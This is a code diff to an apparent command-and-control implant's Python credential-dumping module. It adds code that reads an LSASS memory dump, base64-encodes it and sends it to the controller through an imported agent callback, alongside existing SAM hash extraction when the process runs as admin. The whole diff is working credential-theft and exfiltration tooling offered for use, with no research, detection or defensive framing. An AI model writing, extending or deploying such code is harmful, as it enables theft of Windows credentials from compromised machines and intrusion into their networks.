@@ -70,8 +70,8 @@ class CredentialDump:
             logging.error(f"Error getting LSASS handle: {str(e)}")
             return None
             
-    def dump_lsass(self, output_file=None):
-        """Dump LSASS process memory"""
+    def dump_lsass(self, output_file=None, send_file_callback=None, task_id=None):
+        """Dump LSASS process memory and optionally send to C2"""
         try:
             if self.os_type != 'Windows':
                 return {
@@ -105,6 +105,19 @@ class CredentialDump:
                 # This is a simplified version
                 pass
                 
+            # Optionally send file to C2
+            if send_file_callback and task_id:
+                with open(output_file, 'rb') as f:
+                    file_data = f.read()
+                encoded_data = base64.b64encode(file_data).decode()
+                send_file_callback(task_id, {
+                    'status': 'success',
+                    'filename': os.path.basename(output_file),
+                    'data': encoded_data,
+                    'type': 'file',
+                    'timestamp': datetime.now().isoformat()
+                })
+            
             win32api.CloseHandle(handle)
             logging.info(f"LSASS dump saved to {output_file}")
             
@@ -273,7 +286,7 @@ def get_windows_sam_hashes():
             'error': str(e)
         }
 
-def dump_credentials():
+def dump_credentials(task_id=None):
     """Main function to dump credentials from various sources"""
     try:
         dumper = CredentialDump()
@@ -292,7 +305,12 @@ def dump_credentials():
             
             # Only attempt LSASS dump if we have admin privileges
             if dumper.check_admin():
-                lsass_result = dumper.dump_lsass()
+                # Import send_result and agent_id from agent if available
+                try:
+                    from agent import send_result
+                except ImportError:
+                    send_result = None
+                lsass_result = dumper.dump_lsass(send_file_callback=send_result if send_result else None, task_id=task_id)
                 results['data']['lsass_dump'] = lsass_result
                 # Add SAM hash extraction
                 sam_hashes = get_windows_sam_hashes()
